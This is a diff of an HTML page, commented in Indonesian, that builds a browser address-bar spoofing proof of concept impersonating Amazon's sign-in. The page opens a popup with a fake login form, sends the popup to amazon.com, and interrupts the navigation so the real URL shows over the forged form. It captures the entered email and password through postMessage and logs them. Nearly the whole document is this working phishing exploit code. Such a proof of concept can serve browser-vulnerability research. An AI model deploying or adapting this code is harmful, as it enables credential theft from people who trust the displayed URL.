@@ -1,44 +1,119 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AddressBar Spoofing</title>
+  <meta charset="utf-8">
+  <title>Login with Amazon</title>
 </head>
 <body>
-        <a id="spoof-link" href="javascript:window.open('https://www.amazon.com/','x');" onclick="startSpoof()">Spoof</a>
+  <a id="test" href="https://www.amazon.com/">Login with Amazon</a>
 
-    <script>
-        function startSpoof() {
-            const link = document.getElementById("spoof-link");
-            if (link) {
-                link.outerHTML = `
-                    <h1>This is not Amazon</h1>
-                    <input type="text" placeholder="Username" id="username"><br>
-                    <input type="password" placeholder="Password" id="password"><br>
-                    <button action="#" method="post">Click me</button>
-                `;
-            }
+<script>
+(function () {
+  "use strict";
 
-            const popup = window.open("https://www.amazon.com/", "_blank");
+  var popup;        // referensi jendela popup
+  var waitTimer;    // interval menunggu popup selesai memuat
+  var freezeTimer;  // interval mendeteksi mulainya navigasi cross-origin
 
-            if (!popup) {
-                alert("Pop-up diblokir. Izinkan pop-up lalu coba lagi.");
-                return;
-            }
+  // --- Template form palsu: MARKUP SAJA, tanpa <script> inline ---
+  // (script yang ditaruh lewat innerHTML tidak dieksekusi browser)
+  var FAKE_LOGIN_HTML =
+    '<div class="login-form">' +
+      '<h2>Amazon Sign-In</h2>' +
+      '<form id="loginForm">' +
+        '<input type="email" id="email" placeholder="Email or mobile number">' +
+        '<input type="password" id="password" placeholder="Password">' +
+        '<button type="submit">Sign in</button>' +
+      '</form>' +
+    '</div>';
 
-            popup.location.href = "https://www.amazon.com/";
+  var FAKE_LOGIN_CSS =
+    'body{font-family:Arial,sans-serif;padding:20px;}' +
+    '.login-form{max-width:300px;margin:0 auto;}' +
+    'input{width:100%;padding:10px;margin:5px 0;box-sizing:border-box;}' +
+    'button{width:100%;padding:10px;background:#FF9900;border:none;cursor:pointer;}';
 
-            setTimeout(() => {
-                try {
-                    popup.close();
-                } catch (err) {
-                    console.warn("Gagal menutup popup:", err);
-                }
+  // Render form + pasang handler submit lewat addEventListener (bukan innerHTML+<script>)
+  function renderFakeLogin(win, onSubmit) {
+    var doc = win.document;
+    doc.title = "Amazon Sign-In";
 
-                window.history.back();
-            }, 2000);
-        }
-    </script>
+    var style = doc.createElement("style");
+    style.textContent = FAKE_LOGIN_CSS;
+    doc.head.appendChild(style);
+
+    doc.body.innerHTML = FAKE_LOGIN_HTML;
+
+    doc.getElementById("loginForm").addEventListener("submit", function (e) {
+      e.preventDefault();
+      onSubmit({
+        email: doc.getElementById("email").value,
+        password: doc.getElementById("password").value
+      });
+    });
+  }
+
+  // ===== Cabang POPUP (dibuka dengan ?fake) =====
+  if (location.search.indexOf("fake") !== -1) {
+    renderFakeLogin(window, function (creds) {
+      if (window.opener) {
+        window.opener.postMessage(
+          { type: "credentials", email: creds.email, password: creds.password },
+          "*"
+        );
+      }
+    });
+    return;
+  }
+
+  // ===== Cabang OPENER =====
+  window.addEventListener("message", function (e) {
+    if (e.data && e.data.type === "credentials") {
+      console.log("[captured]", e.data.email, e.data.password);
+    }
+  });
+
+  document.getElementById("test").addEventListener("click", function (e) {
+    e.preventDefault();
+    start();
+  });
+
+  function start() {
+    popup = window.open("?fake");
+
+    // Tampilkan juga form palsu di jendela opener
+    renderFakeLogin(window, function (creds) {
+      console.log("[captured-opener]", creds.email, creds.password);
+    });
+
+    waitTimer = setInterval(whenPopupReady, 30);  // 30ms, bukan 1ms
+  }
+
+  function whenPopupReady() {
+    var href;
+    try { href = popup.location.href; } catch (err) { return; }
+    if (href === "about:blank") return;
+
+    clearInterval(waitTimer);
+
+    // Arahkan popup ke URL asli -> bilah alamat berubah jadi amazon.com
+    popup.location.href = "https://www.amazon.com/";
+
+    freezeTimer = setInterval(freezeAddressBar, 30);
+  }
+
+  function freezeAddressBar() {
+    try {
+      void popup.location.href;            // masih same-origin -> tidak throw
+    } catch (err) {
+      // Exception = navigasi cross-origin ke amazon.com sudah dimulai.
+      // Batalkan pemuatan agar konten lama (form palsu) tetap tampil,
+      // sementara bilah alamat sudah menunjukkan amazon.com.
+      popup.location.href = "https://www.amazon.com/csi";
+      clearInterval(freezeTimer);
+    }
+  }
+})();
+</script>
 </body>
 </html>
